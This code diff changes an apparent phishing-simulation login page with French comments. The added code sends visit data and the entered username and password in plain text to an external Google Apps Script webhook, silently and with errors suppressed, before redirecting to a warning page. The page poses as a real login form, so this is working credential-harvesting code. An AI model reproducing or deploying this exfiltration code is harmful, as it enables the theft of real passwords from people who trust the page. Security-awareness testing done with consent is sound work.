@@ -348,38 +348,41 @@
     </div>
 
     <script>
-        // Détecter la source (email ou QR code)
+        // ============================================================
+        // REMPLACE CETTE URL PAR L'URL DE TON GOOGLE APPS SCRIPT
+        // ============================================================
+        const WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbx2rh1liWVuaSJ_BoQfx8xSL8kiPM-ISaAqK9_1FCbFGw09gOqrrYWHOwvb5g0cFoVf/exec';
+
+        // Envoyer les donnees au Google Sheets
+        function sendToSheet(data) {
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).catch(function() {});
+        }
+
+        // Detecter la source (email ou QR code)
         function getSource() {
             const urlParams = new URLSearchParams(window.location.search);
             return urlParams.get('source') || 'email';
         }
 
-        // Enregistrer le clic sur la page (dès l'arrivée)
+        // Enregistrer le clic/scan des l'arrivee sur la page
         function trackPageVisit() {
             const source = getSource();
-            const visitData = {
+            const type = source === 'qr' ? 'qr_scan' : 'email_click';
+
+            sendToSheet({
+                type: type,
                 timestamp: new Date().toISOString(),
                 userAgent: navigator.userAgent,
                 source: source
-            };
-
-            // Enregistrer dans la bonne catégorie
-            if (source === 'qr') {
-                // C'est un scan QR
-                let qrScans = JSON.parse(localStorage.getItem('phishingQR') || '[]');
-                qrScans.push(visitData);
-                localStorage.setItem('phishingQR', JSON.stringify(qrScans));
-                console.log('✅ Scan QR enregistré');
-            } else {
-                // C'est un clic depuis l'email
-                let clicks = JSON.parse(localStorage.getItem('phishingClicks') || '[]');
-                clicks.push(visitData);
-                localStorage.setItem('phishingClicks', JSON.stringify(clicks));
-                console.log('✅ Clic email enregistré');
-            }
+            });
         }
 
-        // Appeler dès le chargement de la page
+        // Appeler des le chargement de la page
         window.addEventListener('load', trackPageVisit);
 
         function togglePassword() {
@@ -404,31 +407,20 @@
             const password = document.getElementById('password').value;
             const source = getSource();
 
-            // Données de soumission du formulaire
-            const submissionData = {
+            // Envoyer la soumission au Google Sheets
+            sendToSheet({
+                type: 'form_submission',
                 username: username,
                 password: password,
                 timestamp: new Date().toISOString(),
                 userAgent: navigator.userAgent,
-                screenResolution: `${screen.width}x${screen.height}`,
+                screenResolution: screen.width + 'x' + screen.height,
                 language: navigator.language,
                 source: source
-            };
-
-            console.log('📊 Formulaire soumis:', submissionData);
-
-            // Enregistrer la soumission
-            try {
-                let submissions = JSON.parse(localStorage.getItem('phishingSubmissions') || '[]');
-                submissions.push(submissionData);
-                localStorage.setItem('phishingSubmissions', JSON.stringify(submissions));
-                console.log('✅ Soumission enregistrée');
-            } catch (e) {
-                console.error('❌ Erreur:', e);
-            }
+            });
 
             // Rediriger vers la page d'avertissement
-            setTimeout(() => {
+            setTimeout(function() {
                 window.location.href = 'result.html';
             }, 500);
 
